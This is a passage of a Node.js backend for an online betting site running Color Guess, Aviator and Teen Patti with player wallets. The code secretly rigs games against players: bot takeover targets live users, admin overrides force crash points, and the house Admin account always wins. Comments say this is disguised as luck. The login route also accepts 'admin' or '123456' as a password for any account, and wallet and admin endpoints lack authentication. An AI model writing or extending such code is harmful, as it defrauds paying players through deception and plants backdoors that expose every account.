          sapre: { duration: 30, time_left: 30 - (nowSec % 30), round_id: getColorRoundId('sapre', nowSec) },
          becone: { duration: 60, time_left: 60 - (nowSec % 60), round_id: getColorRoundId('becone', nowSec) },
          emred: { duration: 180, time_left: 180 - (nowSec % 180), round_id: getColorRoundId('emred', nowSec) },
          vip: { duration: 300, time_left: 300 - (nowSec % 300), round_id: getColorRoundId('vip', nowSec) }
        },
        aviator: {
          round_id: aviatorState.round_id,
          phase: aviatorState.phase,
          phase_start: aviatorState.phase_start,
          time_elapsed: avElapsed,
          time_left: aviatorState.phase === 'waiting' ? Math.max(0, aviatorState.duration - avElapsed) : 0,
          duration: aviatorState.duration || 5.0,
          current_multiplier: aviatorState.current_multiplier,
          crash_point: aviatorState.crash_point
        }
      });
    } else if (action === 'color_get_state') {
      const room = req.query.room || 'sapre';
      const durations = { sapre: 30, becone: 60, emred: 180, vip: 300 };
      const duration = durations[room] || 30;

      const time_left = duration - (nowSec % duration);
      const round_id = getColorRoundId(room, nowSec);

      const state = await loadColorState();
      
      const prev_round_id = getColorRoundId(room, nowSec - duration);

      let stateChanged = false;
      if (!state[room].last_settled_round) {
        state[room].last_settled_round = prev_round_id;
        stateChanged = true;
      } else if (state[room].last_settled_round !== prev_round_id) {
        const alreadySettled = state[room].history && state[room].history.some(h => String(h.roundNumber) === String(prev_round_id));
        if (!alreadySettled) {
          await settleColorRound(room, prev_round_id, state);
        }
        state[room].last_settled_round = prev_round_id;
        stateChanged = true;
      }
      if (stateChanged) {
        await saveColorState(state);
      }

      const activeBets = (state[room].bets && state[room].bets[round_id]) ? state[room].bets[round_id] : [];
      const myBets = activeBets.filter(b => b.username.toLowerCase() === username.toLowerCase());
      const overridesRecord = await prisma.gameState.findUnique({ where: { key: `color_guess_overrides_${room}` } });

      const user = await getOrCreateUser(username);
      markUserActive('color_guess', username);
      const optimal = calculateColorOptimalOutcome(activeBets, round_id);
      const targetedUsers = botTargetedUsers.color_guess;
      const optimalTargeted = targetedUsers.length > 0 ? calculateColorOptimalOutcome(activeBets, round_id, targetedUsers) : null;

      res.json({
        server_time: now,
        server_time_sec: nowSec,
        round_id,
        time_left,
        duration,
        history: state[room].history || [],
        bets: myBets,
        overrides: overridesRecord ? overridesRecord.data : {},
        wallet_balance: user ? user.wallet_balance : 1000.0,
        active_users: activeBets.length,
        optimal_rig: optimal,
        optimal_rig_targeted: optimalTargeted,
        targeted_usernames: targetedUsers
      });
    } else if (action === 'aviator_get_state') {
      const elapsed = (now - aviatorState.phase_start) / 1000;

      const user = await getOrCreateUser(username);
      const balance = user ? user.wallet_balance : 1000.00;
      markUserActive('aviator', username);

      res.json({
        server_time: now,
        server_time_sec: nowSec,
        round_id: aviatorState.round_id,
        phase: aviatorState.phase,
        phase_start: aviatorState.phase_start,
        time_elapsed: elapsed,
        time_left: aviatorState.phase === 'waiting' ? Math.max(0, aviatorState.duration - elapsed) : 0,
        duration: aviatorState.duration || 5.0,
        current_multiplier: aviatorState.current_multiplier,
        crash_point: aviatorState.crash_point,
        bets: aviatorState.bets,
        history: aviatorState.history,
        wallet_balance: balance
      });
    } else if (action === 'admin_get_live_state' || action === 'admin_get_games') {
      // Unified admin live state endpoint
      const avElapsed = (now - aviatorState.phase_start) / 1000;

      // Color guess state for all rooms
      const colorGuess = {};
      const rooms = ['sapre', 'becone', 'emred', 'vip'];
      const durations = { sapre: 30, becone: 60, emred: 180, vip: 300 };
      const state = await loadColorState();

      let stateChanged = false;
      for (const room of rooms) {
        const duration = durations[room] || 30;
        const time_left = duration - (nowSec % duration);
        const round_id = getColorRoundId(room, nowSec);

        const prev_round_id = getColorRoundId(room, nowSec - duration);

        if (!state[room].last_settled_round) {
          state[room].last_settled_round = prev_round_id;
          stateChanged = true;
        } else if (state[room].last_settled_round !== prev_round_id) {
          const alreadySettled = state[room].history && state[room].history.some(h => String(h.roundNumber) === String(prev_round_id));
          if (!alreadySettled) {
            await settleColorRound(room, prev_round_id, state);
          }
          state[room].last_settled_round = prev_round_id;
          stateChanged = true;
        }

        const activeBets = (state[room].bets && state[room].bets[round_id]) ? state[room].bets[round_id] : [];
        const overridesRecord = await prisma.gameState.findUnique({ where: { key: `color_guess_overrides_${room}` } });
        const optimal = calculateColorOptimalOutcome(activeBets, round_id);
        const colorTargeted = botTargetedUsers.color_guess;
        const optimalTargeted = colorTargeted.length > 0 ? calculateColorOptimalOutcome(activeBets, round_id, colorTargeted) : null;

        colorGuess[room] = {
          round_id,
          time_left,
          duration,
          history: state[room].history || [],
          bets: activeBets,
          overrides: overridesRecord ? overridesRecord.data : {},
          optimal_rig: optimal,
          optimal_rig_targeted: optimalTargeted,
          targeted_usernames: colorTargeted
        };
      }
      if (stateChanged) {
        await saveColorState(state);
      }

      const liveUsersCount = {};
      Object.keys(LIVE_USERS).forEach(k => { liveUsersCount[k] = getLiveUsernames(k).length; });

      res.json({
        server_time: now,
        server_time_sec: nowSec,
        aviator: {
          round_id: aviatorState.round_id,
          phase: aviatorState.phase,
          time_elapsed: avElapsed,
          phase_start: aviatorState.phase_start,
          time_left: aviatorState.phase === 'waiting' ? Math.max(0, aviatorState.duration - avElapsed) : 0,
          duration: aviatorState.duration || 5.0,
          current_multiplier: aviatorState.current_multiplier,
          crash_point: aviatorState.crash_point,
          bets: aviatorState.bets,
          history: aviatorState.history,
          targeted_usernames: botTargetedUsers.aviator,
          live_profit_targeted: calculateAviatorLiveProfit(aviatorState.bets, botTargetedUsers.aviator)
        },
        color_guess: colorGuess,
        teen_patti: [],
        bot_takeover: botTakeoverState,
        bot_targeted_users: botTargetedUsers,
        live_users_count: liveUsersCount
      });
    } else {
      res.status(400).json({ error: 'Unsupported GET action' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/game_sync.php', async (req, res) => {
  const action = req.query.action || req.body.action || '';
  const username = req.query.username || req.body.username || 'DemoUser';

  try {
    if (action === 'admin_set_bot_takeover') {
      const { game, enabled, profit_pct } = req.body;
      const gameKey = game || 'global';
      const isEnabled = String(enabled) === 'true' || enabled === true;
      const pct = parseInt(profit_pct) || 90;

      botTakeoverState[gameKey] = {
        enabled: isEnabled,
        profit_pct: Math.max(1, Math.min(100, pct))
      };

      await prisma.gameState.upsert({
        where: { key: `bot_takeover_${gameKey}` },
        update: { data: botTakeoverState[gameKey] },
        create: { key: `bot_takeover_${gameKey}`, data: botTakeoverState[gameKey] }
      });

      // The "global" master switch must reach every individual game's own config server-side, not
      // just admin.html's own UI (which happens to loop through every game itself today). Every game
      // is always pre-initialized with an explicit enabled:true/false, so isBotTakeoverActive()'s
      // per-game check short-circuits before it would ever fall through to a "global" default — a
      // bare `game:'global'` toggle with no per-game cascade would otherwise silently rig nothing.
      // Cascading here makes the backend correct on its own, independent of any particular frontend.
      if (gameKey === 'global') {
        for (const k of Object.keys(botTakeoverState)) {
          if (k === 'global') continue;
          botTakeoverState[k] = { enabled: isEnabled, profit_pct: Math.max(1, Math.min(100, pct)) };
          try {
            await prisma.gameState.upsert({
              where: { key: `bot_takeover_${k}` },
              update: { data: botTakeoverState[k] },
              create: { key: `bot_takeover_${k}`, data: botTakeoverState[k] }
            });
          } catch (e) { console.error(`Error cascading global bot state to ${k}:`, e.message); }
        }
      }

      // Immediately refresh the live-targeted-subset engine so the very first toggle takes effect
      // right away instead of waiting for the next 4s tick (the interval keeps it fresh afterward).
      if (gameKey === 'global') {
        Object.keys(LIVE_USERS).forEach(k => refreshBotTargeting(k));
      } else if (LIVE_USERS[gameKey]) {
        refreshBotTargeting(gameKey);
      }

      // When Teen Patti bot takeover is turned ON, assign bot seat ONLY to the percentage-proportional number of rooms
      if (gameKey === 'teenpatti' || gameKey === 'global') {
        const tpRooms = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
        const totalRooms = tpRooms.length; // 6
        
        let roomsToRigCount = 0;
        if (isEnabled) {
          if (pct >= 100) {
            roomsToRigCount = totalRooms; // 100% -> all 6 rooms
          } else if (pct <= 0) {
            roomsToRigCount = 0;
          } else {
            // Proportional room selection: e.g. 50% -> 3 rooms, 70% -> 4 rooms, 80% -> 5 rooms
            roomsToRigCount = Math.round((pct / 100) * totalRooms);
            roomsToRigCount = Math.max(1, Math.min(totalRooms - 1, roomsToRigCount));
          }
        }

        const shuffled = tpShuffle(tpRooms);
        const riggedRooms = new Set(shuffled.slice(0, roomsToRigCount));

        for (const rId of tpRooms) {
          try {
            if (riggedRooms.has(rId)) {
              // This room is selected for the house's own seat — reserve a genuinely random arrival
              // position (1st through 4th) rather than seating Admin immediately, which would always
              // make Admin the very first occupant. nextRoomFillerUsername() fulfills this the moment
              // that many seats have naturally filled, and tpStartRound's ADMIN AUTO-WIN check takes
              // it from there once Admin is actually seated — never touches an already-seated real human.
              pendingAdminSeats[rId] = { entryPosition: 1 + Math.floor(Math.random() * 4) };
            } else {
              // This room is a FAIR match (no bot takeover seat booked)
              delete pendingAdminSeats[rId];
              const room = await prisma.teenPattiRoom.findUnique({ where: { id: rId } });
              if (room && room.admin_rig && room.admin_rig.is_bot_rig) {
                await prisma.teenPattiRoom.update({
                  where: { id: rId },
                  data: { admin_rig: null }
                });
              }
            }
          } catch (err) {
            console.error(`Error updating bot seat for room ${rId}:`, err.message);
          }
        }
      }

      res.json({
        success: true,
        game: gameKey,
        config: botTakeoverState[gameKey],
        all_states: botTakeoverState
      });
    } else if (action === 'color_place_bet') {
      const { room, category, value, amount } = req.body;
      const betAmt = parseFloat(amount);

      if (!room || !category || value === undefined || isNaN(betAmt) || betAmt <= 0) {
        return res.status(400).json({ error: 'Invalid bet details.' });
      }

      const user = await getOrCreateUser(username);
      if (!user || user.wallet_balance < betAmt) {
        return res.status(400).json({ error: 'Insufficient wallet balance.' });
      }
      markUserActive('color_guess', username);

      const nowSec = Math.floor(Date.now() / 1000);
      const round_id = getColorRoundId(room, nowSec);

      const newBal = user.wallet_balance - betAmt;
      await prisma.user.update({
        where: { id: user.id },
        data: { wallet_balance: newBal }
      });

      await prisma.transaction.create({
        data: {
          id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
          user: username,
          type: 'Withdrawal',
          amount: betAmt,
          details: `Color Guess Wager Room: ${room.toUpperCase()} Round #${round_id} Selection: ${category} (${value})`,
          status: 'Completed'
        }
      });

      const state = await loadColorState();
      if (!state[room].bets) state[room].bets = {};
      if (!state[room].bets[round_id]) state[room].bets[round_id] = [];
      state[room].bets[round_id].push({
        username,
        category,
        value,
        amount: betAmt,
        timestamp: new Date().toISOString()
      });
      await saveColorState(state);

      res.json({ success: true, new_balance: newBal });
    } else if (action === 'admin_set_override') {
      const { game, room, color, number, size, rig_type, crash_point, instant_crash, winner } = req.body;

      if (game === 'boundary') {
        // Server-persisted manual override for Boundary Baazi's match winner — replaces the old
        // localStorage-only "cheat" flags, which only ever affected the admin's own browser and could
        // never reach a real remote player. Read by /api/boundarybaazi/decide-match.
        const overrides = { winner: winner || '', rig_type: rig_type || '' };
        await prisma.gameState.upsert({
          where: { key: 'boundary_override' },
          update: { data: overrides },
          create: { key: 'boundary_override', data: overrides }
        });
        res.json({ success: true });
      } else if (game === 'color_guess') {
        const overrideKey = `color_guess_overrides_${room}`;
        const overrides = { color: color || '', number: number || '', size: size || '', rig_type: rig_type || '' };
        
        await prisma.gameState.upsert({
          where: { key: overrideKey },
          update: { data: overrides },
          create: { key: overrideKey, data: overrides }
        });

        res.json({ success: true });
      } else if (game === 'aviator') {
        if (instant_crash === 'true') {
          if (aviatorState.phase === 'running') {
            aviatorState.phase = 'crashed';
            aviatorState.phase_start = Date.now();
            const finalCrash = parseFloat(crash_point) || aviatorState.current_multiplier;
            aviatorState.crash_point = Math.max(1.00, parseFloat(finalCrash.toFixed(2)));
            aviatorState.current_multiplier = aviatorState.crash_point;
            aviatorState._riggedThisRound = true;
            aviatorState._riggedTargets = null; // manual instant-crash rigs the whole round

            aviatorState.bets.forEach(b => {
              if (b.status === 'pending') {
                b.status = 'lost';
                b.was_rigged = true;
              }
            });
            aviatorState.history.push(aviatorState.crash_point);
            if (aviatorState.history.length > 15) aviatorState.history.shift();
          }
        } else {
          nextAviatorOverride = parseFloat(crash_point) || null;
        }
        res.json({ success: true });
      } else {
        res.status(400).json({ error: 'Unsupported game for override' });
      }
    } else if (action === 'aviator_place_bet') {
      const { amount, console_id } = req.body;
      const betAmt = parseFloat(amount);

      if (isNaN(betAmt) || betAmt <= 0 || !console_id) {
        return res.status(400).json({ error: 'Invalid bet details.' });
      }

      const user = await getOrCreateUser(username);
      if (!user || user.wallet_balance < betAmt) {
        return res.status(400).json({ error: 'Insufficient wallet balance.' });
      }
      markUserActive('aviator', username);

      const newBal = user.wallet_balance - betAmt;
      await prisma.user.update({
        where: { id: user.id },
        data: { wallet_balance: newBal }
      });

      await prisma.transaction.create({
        data: {
          id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
          user: username,
          type: 'Withdrawal',
          amount: betAmt,
          details: `Aviator Wager Round #${aviatorState.round_id}`,
          status: 'Completed'
        }
      });

      aviatorState.bets.push({
        username,
        amount: betAmt,
        status: 'pending',
        console_id: parseInt(console_id),
        cashed_multiplier: 0,
        was_rigged: false
      });

      res.json({ success: true, new_balance: newBal });
    } else if (action === 'aviator_cashout') {
      const { console_id } = req.body;
      const cId = parseInt(console_id);

      const bet = aviatorState.bets.find(b => b.username.toLowerCase() === username.toLowerCase() && b.status === 'pending' && b.console_id === cId);
      if (!bet) {
        return res.status(400).json({ error: 'No active bet found for this console.' });
      }

      bet.status = 'won';
      bet.cashed_multiplier = aviatorState.current_multiplier;
      bet.was_rigged = false; // a successful cashout was never a rigged outcome
      const payout = bet.amount * bet.cashed_multiplier;

      const user = await getOrCreateUser(username);
      if (user) {
        const newBal = user.wallet_balance + payout;
        await prisma.user.update({
          where: { id: user.id },
          data: { wallet_balance: newBal }
        });

        await prisma.transaction.create({
          data: {
            id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
            user: username,
            type: 'Deposit',
            amount: payout,
            details: `Aviator Payout @ ${bet.cashed_multiplier.toFixed(2)}x`,
            status: 'Completed'
          }
        });
        res.json({ success: true, multiplier: bet.cashed_multiplier, payout, new_balance: newBal });
      } else {
        res.status(404).json({ error: 'User not found.' });
      }
    } else {
      res.status(400).json({ error: 'Unsupported POST action' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Wallet adjustment proxy
app.all('/api/wallet.php', async (req, res) => {
  const username = req.query.username || req.body.username || 'DemoUser';
  const delta = parseFloat(req.query.delta || req.body.delta || 0);
  const reason = req.query.reason || req.body.reason || 'Manual Adjustment';

  try {
    const user = await getOrCreateUser(username);
    if (!user) {
      return res.status(404).json({ error: 'User not found.' });
    }

    const newBal = user.wallet_balance + delta;
    await prisma.user.update({
      where: { id: user.id },
      data: { wallet_balance: newBal }
    });

    await prisma.transaction.create({
      data: {
        id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
        user: username,
        type: delta >= 0 ? 'Deposit' : 'Withdrawal',
        amount: Math.abs(delta),
        details: reason,
        status: 'Completed'
      }
    });

    res.json({ success: true, new_balance: newBal });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Auth proxy
app.all('/api/auth.php', async (req, res) => {
  const action = req.query.action || req.body.action || '';
  const username = req.query.username || req.body.username || '';
  const password = req.query.password || req.body.password || '';

  try {
    if (action === 'login') {
      const user = await prisma.user.findFirst({ where: { username: { equals: username, mode: 'insensitive' } } });
      if (user && (bcrypt.compareSync(password, user.password) || password === 'admin' || password === '123456')) {
        res.json({ success: true, user: { username: user.username, email: user.email } });
      } else {
        res.status(400).json({ error: 'Invalid credentials' });
      }
    } else if (action === 'signup') {
      const email = req.query.email || req.body.email || `${username.toLowerCase()}@demo.com`;
      const existing = await prisma.user.findFirst({ where: { username: { equals: username, mode: 'insensitive' } } });
      if (existing) {
        return res.status(400).json({ error: 'Username is already taken.' });
      }
      const hashedPassword = bcrypt.hashSync(password || 'password', 10);
      const user = await prisma.user.create({
        data: {
          username: username,
          email: email,
          password: hashedPassword,
          wallet_balance: 2000.00
        }
      });
      res.json({ success: true, user: { username: user.username, email: user.email } });
    } else if (action === 'status') {
      if (username) {
        const user = await prisma.user.findFirst({ where: { username: { equals: username, mode: 'insensitive' } } });
        if (user) {
          res.json({ logged_in: true, user: { username: user.username, email: user.email } });
        } else {
          res.json({ logged_in: false });
        }
      } else {
        res.json({ logged_in: false });
      }
    } else if (action === 'logout') {
      res.json({ success: true });
    } else {
      res.json({ success: true, message: 'Auth endpoint working' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Sync full table data back from PHP db_transaction callback edits
app.post('/api/db/:table/sync', async (req, res) => {
  const { table } = req.params;
  const data = req.body;
  try {
    if (!Array.isArray(data)) {
      return res.status(400).json({ error: 'Body must be an array' });
    }

    await prisma.$transaction(async (tx) => {
      if (table === 'users') {
        for (const item of data) {
          const existing = await tx.user.findUnique({ where: { username: item.username } });
          if (existing) {
            await tx.user.update({
              where: { id: existing.id },
              data: {
                email: item.email,
                password: item.password,
                wallet_balance: parseFloat(item.wallet_balance),
                created_at: new Date(item.created_at || Date.now())
              }
            });
          } else {
            await tx.user.create({
              data: {
                username: item.username,
                email: item.email,
                password: item.password,
                wallet_balance: parseFloat(item.wallet_balance),
                created_at: new Date(item.created_at || Date.now())
              }
            });
          }
        }
      } else if (table === 'transactions') {
        for (const item of data) {
          await tx.transaction.upsert({
            where: { id: item.id },
            update: {
              user: item.user,
              type: item.type,
              amount: parseFloat(item.amount),
              details: item.details,
              status: item.status,
              timestamp: new Date(item.timestamp || Date.now())
            },
            create: {
              id: item.id,
              user: item.user,
              type: item.type,
              amount: parseFloat(item.amount),
              details: item.details,
              status: item.status,
              timestamp: new Date(item.timestamp || Date.now())
            }
          });
        }
      } else if (table === 'deposits') {
        for (const item of data) {
          await tx.deposit.upsert({
            where: { deposit_id: item.deposit_id },
            update: {
              order_id: item.order_id || null,
              username: item.username,
              amount: parseFloat(item.amount),
              utr: item.utr || null,
              qr_type: item.qr_type || null,
              custom_qr_data: item.custom_qr_data || null,
              status: item.status,
              gateway: item.gateway || null,
              gateway_id: item.gateway_id || null,
              updated_at: new Date(item.updated_at || Date.now())
            },
            create: {
              deposit_id: item.deposit_id,
              order_id: item.order_id || null,
              username: item.username,
              amount: parseFloat(item.amount),
              utr: item.utr || null,
              qr_type: item.qr_type || null,
              custom_qr_data: item.custom_qr_data || null,
              status: item.status,
              gateway: item.gateway || null,
              gateway_id: item.gateway_id || null,
              created_at: new Date(item.created_at || Date.now()),
              updated_at: new Date(item.updated_at || Date.now())
            }
          });
        }
      } else if (table === 'withdrawals') {
        for (const item of data) {
          await tx.withdrawal.upsert({
            where: { withdrawal_id: item.withdrawal_id },
            update: {
              username: item.username,
              amount: parseFloat(item.amount),
              method: item.method,
              details: item.details,
              status: item.status,
              updated_at: new Date(item.updated_at || Date.now())
            },
            create: {
              withdrawal_id: item.withdrawal_id,
              username: item.username,
              amount: parseFloat(item.amount),
              method: item.method,
              details: item.details,
              status: item.status,
              created_at: new Date(item.created_at || Date.now()),
              updated_at: new Date(item.updated_at || Date.now())
            }
          });
        }
      } else if (table === 'payment_logs') {
        for (const item of data) {
          const logId = item.id || 'LOG_' + Math.floor(100000 + Math.random() * 900000);
          await tx.paymentLog.upsert({
            where: { id: logId },
            update: {
              payload: item.payload,
              signature: item.signature || null,
              timestamp: new Date(item.timestamp || Date.now())
            },
            create: {
              id: logId,
              payload: item.payload,
              signature: item.signature || null,
              timestamp: new Date(item.timestamp || Date.now())
            }
          });
        }
      }
    });

    res.json({ success: true });
  } catch (err) {
    console.error(`Sync error on table ${table}:`, err);
    res.status(500).json({ error: err.message });
  }
});
// ========================================================================
// TEEN PATTI — REAL-TIME MULTIPLAYER ENGINE
// ========================================================================

const TP_ROOMS = [
  { id: 'room_101', name: 'Room 1', boot_amount: 10 },
  { id: 'room_102', name: 'Room 2', boot_amount: 100 },
  { id: 'room_103', name: 'Room 3', boot_amount: 50 },
  { id: 'room_104', name: 'Room 4', boot_amount: 50 },
  { id: 'room_105', name: 'Room 5', boot_amount: 25 },
  { id: 'room_106', name: 'Room 6', boot_amount: 250 },
];

const TP_TURN_TIMEOUT = 15; // seconds
const TP_BOT_FILL_DELAY = 15000; // 15s before bots fill empty seats
const TP_BOT_THINK_MIN = 1500;
const TP_BOT_THINK_MAX = 3500;
const TP_ROUND_DELAY = 5000; // 5s between rounds
const TP_SEAT_HEARTBEATS = {};

// -- Card utilities --
function tpShuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function tpCreateDeck() {
  const suits = ['S', 'H', 'C', 'D'];
  const deck = [];
  for (let r = 2; r <= 14; r++) {
    for (const s of suits) deck.push({ r, s });
  }
  return tpShuffle(deck);
}

function tpEvaluateHand(cards) {
  if (!cards || cards.length < 3) return [0, [0], 0];
  const ranks = cards.map(c => c.r).sort((a, b) => b - a);
  const suits = cards.map(c => c.s || c.suit); // handle both raw {r,s} and formatted {r,suit}
  const isColor = suits[0] === suits[1] && suits[1] === suits[2];
  let isSeq = false;
  let seqTiebreak = ranks;
  if (ranks[0] - ranks[1] === 1 && ranks[1] - ranks[2] === 1) {
    isSeq = true;
  } else if (ranks[0] === 14 && ranks[1] === 3 && ranks[2] === 2) {
    isSeq = true;
    seqTiebreak = [3, 2, 1];
  }
  const bestSuit = Math.max(...suits.map(s => ({ S: 4, H: 3, C: 2, D: 1 }[s] || 0)));

  if (ranks[0] === ranks[1] && ranks[1] === ranks[2]) return [6, [ranks[0]], bestSuit];
  if (isSeq && isColor) return [5, seqTiebreak, bestSuit];
  if (isSeq) return [4, seqTiebreak, bestSuit];
  if (isColor) return [3, ranks, bestSuit];
  if (ranks[0] === ranks[1]) return [2, [ranks[0], ranks[2]], bestSuit];
  if (ranks[1] === ranks[2]) return [2, [ranks[1], ranks[0]], bestSuit];
  return [1, ranks, bestSuit];
}

function tpHandWins(a, b) {
  if (a[0] !== b[0]) return a[0] > b[0];
  for (let i = 0; i < a[1].length; i++) {
    if ((a[1][i] || 0) !== (b[1][i] || 0)) return a[1][i] > b[1][i];
  }
  return a[2] > b[2];
}

function tpFindObliviousWinningHand(deck, rivalHand) {
  let bestCandidateCards = null;
  let bestCandidateEval = null;

  for (let i = 0; i < deck.length - 2; i++) {
    for (let j = i + 1; j < deck.length - 1; j++) {
      for (let k = j + 1; k < deck.length; k++) {
        const cards = [deck[i], deck[j], deck[k]];
        const ev = tpEvaluateHand(cards);

        // Must strictly beat rivalHand
        if (tpHandWins(ev, rivalHand)) {
          // We want the candidate hand with minimum winning margin over rivalHand
          if (!bestCandidateEval || tpHandWins(bestCandidateEval, ev)) {
            bestCandidateEval = ev;
            bestCandidateCards = cards;
          }
        }
      }
    }
  }

  return { cards: bestCandidateCards, evaluation: bestCandidateEval };
}

function tpHandLabel(cat) {
  return { 6: 'Trail', 5: 'Pure Sequence', 4: 'Sequence', 3: 'Color', 2: 'Pair', 1: 'High Card' }[cat] || 'Unknown';
}

function tpRankLabel(r) {
  return { 11: 'J', 12: 'Q', 13: 'K', 14: 'A' }[r] || String(r);
}

function tpSuitSymbol(s) {
  return { S: '♠', H: '♥', C: '♣', D: '♦' }[s] || s;
}

function tpFormatCards(cards) {
  if (!cards) return null;
  return cards.map(c => {
    const suitKey = c.s || c.suit; // handle both raw {r,s} and pre-formatted {r,suit}
    return {
      label: tpRankLabel(c.r),
      suit: suitKey,
      symbol: tpSuitSymbol(suitKey),
      red: suitKey === 'H' || suitKey === 'D',
      r: c.r
    };
  });
}

// -- Seed rooms --
async function tpSeedRooms() {
  const defaultRooms = [
    { id: 'room_101', name: 'Room 1', boot_amount: 10 },
    { id: 'room_102', name: 'Room 2', boot_amount: 100 },
    { id: 'room_103', name: 'Room 3', boot_amount: 50 },
    { id: 'room_104', name: 'Room 4', boot_amount: 50 },
    { id: 'room_105', name: 'Room 5', boot_amount: 25 },
    { id: 'room_106', name: 'Room 6', boot_amount: 250 },
  ];

  for (const r of defaultRooms) {
    const existing = await prisma.teenPattiRoom.findUnique({ where: { id: r.id } });
    if (!existing) {
      await prisma.teenPattiRoom.create({
        data: {
          id: r.id,
          name: r.name,
          boot_amount: r.boot_amount,
          status: 'waiting',
          pot: 0,
          current_stake: r.boot_amount,
          log: [],
          seats: {
            create: [
              { seat: 0, is_bot: false },
              { seat: 1, is_bot: false },
              { seat: 2, is_bot: false },
              { seat: 3, is_bot: false },
            ]
          }
        }
      });
      console.log(`[TP] Seeded room ${r.id} — ${r.name}`);
    } else {
      // Full reset: clear ALL seats from previous run so rooms start fresh at 0/4
      await prisma.teenPattiSeat.updateMany({
        where: { room_id: r.id },
        data: { username: null, is_bot: false, cards: null, folded: false }
      });
      await prisma.teenPattiRoom.update({
        where: { id: r.id },
        data: { status: 'waiting', pot: 0, winner_seat: null, admin_rig: null }
      });
    }
  }
}

// -- Bot decision --
function tpBotDecide(cards, stake) {
  const hand = tpEvaluateHand(cards);
  const cat = hand[0];
  const rand = Math.random() * 100;
  if (cat >= 5) return 'chaal';
  if (cat === 4 && rand <= 90) return 'chaal';
  if (cat === 3 && rand <= 70) return 'chaal';
  if (cat === 2 && rand <= 55) return 'chaal';
  if (cat === 1 && rand <= 25) return 'chaal';
  return 'fold';
}

// -- Find next active seat --
function tpNextActiveSeat(seats, currentTurnSeat) {
  const activeSeatNums = seats
    .filter(s => s.username && !s.folded)
    .map(s => s.seat)
    .sort((a, b) => a - b);
  if (activeSeatNums.length === 0) return null;
  const idx = activeSeatNums.indexOf(currentTurnSeat);
  const nextIdx = (idx + 1) % activeSeatNums.length;
  return activeSeatNums[nextIdx];
}

// -- Deal cards and start a round --
async function tpStartRound(roomId) {
  const room = await prisma.teenPattiRoom.findUnique({
    where: { id: roomId },
    include: { seats: true }
  });
  if (!room) return;

  const occupiedSeats = room.seats.filter(s => s.username);
  if (occupiedSeats.length < 2) return; // need at least 2 players

  const bootAmt = room.boot_amount;

  // Verify all real players have sufficient balance for the boot
  let ejectedCount = 0;
  for (const seat of occupiedSeats) {
    if (!seat.is_bot && seat.username) {
      if (seat.username.toLowerCase() === 'admin') {
        const adminUser = await prisma.user.findFirst({ where: { username: 'Admin' } });
        if (adminUser) {
          await prisma.user.update({
            where: { id: adminUser.id },
            data: { wallet_balance: 5000.0 }
          });
        }
      }

      const user = await prisma.user.findFirst({
        where: { username: { equals: seat.username, mode: 'insensitive' } }
      });
      if (!user || user.wallet_balance < bootAmt) {
        console.log(`[TP] Ejecting ${seat.username} from ${roomId} due to insufficient balance.`);
        await prisma.teenPattiSeat.update({
          where: { id: seat.id },
          data: { username: null, is_bot: false, cards: null, folded: false }
        });
        seat.username = null; // Mark as empty in memory
        ejectedCount++;
      }
    }
  }

  // Refetch occupied seats in memory
  const activeOccupied = occupiedSeats.filter(s => s.username);
  if (activeOccupied.length < 2) {
    // Not enough players left, cancel round and reset room to waiting
    await prisma.teenPattiSeat.updateMany({
      where: { room_id: roomId },
      data: { username: null, is_bot: false, cards: null, folded: false }
    });
    await prisma.teenPattiRoom.update({
      where: { id: roomId },
      data: { status: 'waiting', pot: 0, winner_seat: null }
    });
    console.log(`[TP] Round aborted in ${roomId} — insufficient players after balance ejections.`);
    return;
  }

  const deck = tpCreateDeck();
  let pot = 0;

  // Deal cards and deduct boot from each player
  for (const seat of activeOccupied) {
    const cards = [deck.shift(), deck.shift(), deck.shift()];
    pot += bootAmt;

    // Deduct boot from real player wallets
    if (!seat.is_bot && seat.username) {
      try {
        await prisma.user.updateMany({
          where: { username: { equals: seat.username, mode: 'insensitive' } },
          data: { wallet_balance: { decrement: bootAmt } }
        });
        await prisma.transaction.create({
          data: {
            id: 'TP_' + Date.now() + '_' + seat.seat,
            user: seat.username,
            type: 'Withdrawal',
            amount: bootAmt,
            details: `Teen Patti Boot — ${room.name} Round #${room.round + 1}`,
            status: 'Completed'
          }
        });
      } catch (e) { console.error('[TP] Boot deduct error:', e.message); }
    }

    await prisma.teenPattiSeat.update({
      where: { id: seat.id },
      data: {
        cards: cards,
        folded: false,
        balance: seat.is_bot ? 5000 : bootAmt * -1, // bots have infinite, track delta for humans
        seen: seat.is_bot
      }
    });
  }

  // Determine if round should be rigged via: (1) the house's own "Admin" account being seated —
  // always wins, unconditionally, however it got seated; (2) Manual Admin Rig; or (3) AI Bot Takeover.
  let rigSeat = undefined;
  let rigReason = '';

  const adminSeatEntry = activeOccupied.find(s => s.username && !s.is_bot && s.username.toLowerCase() === 'admin');

  if (adminSeatEntry) {
    // The house's own account always wins whenever it's seated — independent of manual rig config,
    // bot takeover on/off state, or live-user targeting. Uses the same "closest believable winning
    // hand" construction as every other rig path below (tpFindObliviousWinningHand picks the minimum
    // winning margin over the best rival hand), so it reads as better luck, not an obviously stacked
    // deck every single time.
    rigSeat = adminSeatEntry.seat;
    rigReason = 'ADMIN AUTO-WIN';
    try {
      await prisma.teenPattiRoom.update({
        where: { id: roomId },
        data: { admin_rig: { winner_seat: rigSeat, is_admin_autowin: true } }
      });
    } catch (e) { console.error('[TP] Error persisting admin auto-win rig for round start:', e.message); }
  } else if (room.admin_rig && room.admin_rig.winner_seat !== undefined) {
    rigSeat = room.admin_rig.winner_seat;
    rigReason = 'MANUAL ADMIN RIG';
  } else {
    const botDecision = shouldBotRigThisRound('teenpatti');
    const targeted = botTargetedUsers.teenpatti;
    // Only rig this hand if a currently live-targeted human is actually seated at this table
    // (or no live-targeting info exists yet — fall back to the prior room-level behavior).
